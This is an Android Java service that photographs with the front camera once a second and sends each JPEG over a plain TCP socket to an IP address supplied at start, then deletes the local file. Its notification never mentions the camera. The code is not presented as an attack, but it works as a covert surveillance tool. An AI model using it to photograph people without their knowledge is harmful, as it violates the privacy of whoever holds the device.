package com.example.myapplication;

import android.Manifest;
import android.app.*;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.*;
import android.util.Log;
import android.view.Surface;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import java.io.*;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class PhotoService extends Service {
    private static final String TAG = "PhotoService";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "PhotoServiceChannel";
    private CameraManager cameraManager;
    private final List<String> cameraIds = new ArrayList<>();
    private Timer timer;
    private ImageReader imageReader;
    private CameraCaptureSession cameraCaptureSession;
    private CameraDevice cameraDevice;
    private Handler mainHandler;
    private static String SERVER_IP = "192.168.31.214";
    private static final int SERVER_PORT = 12345;
    private int currentCameraIndex = 0;
    private boolean isCameraBusy = false;
    private Notification notification;
    private final boolean isFrontCameraEnabled = true; // 控制前置摄像头是否拍照
    private final boolean isBackCameraEnabled = false; // 控制后置摄像头是否拍照
    @Override

    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        createNotificationChannel();

        // 创建 Notification 对象
        notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Photo Service")
                .setContentText("Service is running in the foreground")
                .setSmallIcon(R.mipmap.ic_launcher) // 设置一个有效的图标
                .build();

        // 开始前台服务并显示通知
        startForeground(NOTIFICATION_ID, notification);


    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand");
        if (intent != null) {
            SERVER_IP = intent.getStringExtra("IP_ADDRESS");
            if (SERVER_IP != null && !SERVER_IP.isEmpty()) {
                cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
                initializeCameras();
                startCapturing();
            } else {
                Log.e(TAG, "IP Address is null or empty");
                stopSelf();
                Toast.makeText(this, "IP地址无效，服务停止", Toast.LENGTH_SHORT).show();
            }
        }
        return START_STICKY;
    }
    private void initializeCameras() {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Camera permission not granted");
                return;
            }

            String[] ids = cameraManager.getCameraIdList();
            for (String id : ids) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    // 只添加启用的摄像头
                    if ((facing == CameraCharacteristics.LENS_FACING_FRONT && isFrontCameraEnabled) ||
                        (facing == CameraCharacteristics.LENS_FACING_BACK && isBackCameraEnabled)) {
                        cameraIds.add(id);
                        Log.d(TAG, "Added camera: " + id + " facing: " + 
                            (facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : "FRONT"));
                    } else {
                        Log.d(TAG, "Skipped disabled camera: " + id + " facing: " + 
                            (facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : "FRONT"));
                    }
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to access camera", e);
        }
    }

    private void startCapturing() {
        if (cameraIds.isEmpty()) {
            Log.e(TAG, "No cameras available");
            return;
        }

        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                if (!isCameraBusy) {
                    mainHandler.post(() -> capturePhoto());
                }
            }
        }, 0, 1000); // 每秒执行一次
    }

    private void capturePhoto() {
        if (cameraIds.isEmpty() || isCameraBusy) {
            return;
        }

        isCameraBusy = true;
        String currentCameraId = cameraIds.get(currentCameraIndex);

        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                return;
            }

            imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                try (Image image = reader.acquireLatestImage()) {
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.capacity()];
                        buffer.get(bytes);
                        saveImageAndSend(bytes, currentCameraId);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to process image", e);
                }
            }, mainHandler);

            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        List<Surface> surfaces = Collections.singletonList(imageReader.getSurface());
                        camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder builder =
                                            camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(imageReader.getSurface());

                                    // 如果是前置摄像头，需要旋转图像
                                    CameraCharacteristics characteristics =
                                            cameraManager.getCameraCharacteristics(currentCameraId);
                                    Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                                    if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                                        builder.set(CaptureRequest.JPEG_ORIENTATION, 270);
                                    } else {
                                        builder.set(CaptureRequest.JPEG_ORIENTATION, 90);
                                    }

                                    session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                        @Override
                                        public void onCaptureCompleted(@NonNull CameraCaptureSession session,
                                                                       @NonNull CaptureRequest request,
                                                                       @NonNull TotalCaptureResult result) {
                                            super.onCaptureCompleted(session, request, result);
                                            closeCamera();
                                        }
                                    }, mainHandler);
                                } catch (CameraAccessException e) {
                                    Log.e(TAG, "Failed to capture photo", e);
                                    closeCamera();
                                }
                            }

                            @Override
                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                Log.e(TAG, "Failed to configure camera session");
                                closeCamera();
                            }
                        }, mainHandler);
                    } catch (CameraAccessException e) {
                        Log.e(TAG, "Failed to create capture session", e);
                        closeCamera();
                    }
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    closeCamera();
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Camera error: " + error);
                    closeCamera();
                }
            }, mainHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to access camera", e);
            isCameraBusy = false;
        }
    }
    private void closeCamera() {
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (cameraCaptureSession != null) {
            cameraCaptureSession.close();
            cameraCaptureSession = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }

        // 切换到下一个摄像头
        currentCameraIndex = (currentCameraIndex + 1) % cameraIds.size();
        isCameraBusy = false;
    }
    private void saveImageAndSend(byte[] bytes, String cameraId) {
        String timestamp = new SimpleDateFormat("dd-HH-mm-ss", Locale.getDefault()).format(new Date());

        // 获取摄像头朝向
        try {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
            String facingStr = (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) ? "front" : "back";

            String fileName = timestamp + "-" + facingStr + ".jpg";
            File cacheFile = new File(getCacheDir(), fileName);

            try (FileOutputStream fos = new FileOutputStream(cacheFile)) {
                fos.write(bytes);
                sendFileToServer(cacheFile);
            } catch (IOException e) {
                Log.e(TAG, "Failed to save image", e);
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to get camera characteristics", e);
        }
    }

    private void sendFileToServer(File file) {
        AtomicBoolean isConnecting = new AtomicBoolean(false);
        if (!file.exists()) {
            Log.d(TAG, "Skip sending: " + "File doesn't exist");
            return;
        }

        new Thread(() -> {
            isConnecting.set(true);
            Socket socket = null;
            try {
                socket = new Socket(SERVER_IP, SERVER_PORT);
                Log.d(TAG, "Connected to server");

                try (DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
                     FileInputStream fis = new FileInputStream(file)) {

                    // 发送文件名
                    String fileName = file.getName();
                    Log.d(TAG, "Sending filename: " + fileName);
                    dos.writeUTF(fileName);
                    dos.flush();

                    // 发送文件内容
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        dos.write(buffer, 0, bytesRead);
                    }
                    dos.flush();

                    Log.d(TAG, "File sent successfully: " + fileName);
                }

            } catch (IOException e) {
                Log.e(TAG, "Failed to send file: " + e.getMessage());
            } finally {
                isConnecting.set(false);
                if (socket != null) {
                    try {
                        socket.close();
                    } catch (IOException e) {
                        Log.e(TAG, "Error closing socket", e);
                    }
                }
                if (file.exists()) {
                    if (file.delete()) {
                        Log.d(TAG, "Cache file deleted");
                    } else {
                        Log.e(TAG, "Failed to delete cache file");
                    }
                }
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        if (cameraDevice != null) {
            cameraDevice.close();
        }
        if (cameraCaptureSession != null) {
            cameraCaptureSession.close();
        }
        if (imageReader != null) {
            imageReader.close();
        }
    }
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }
}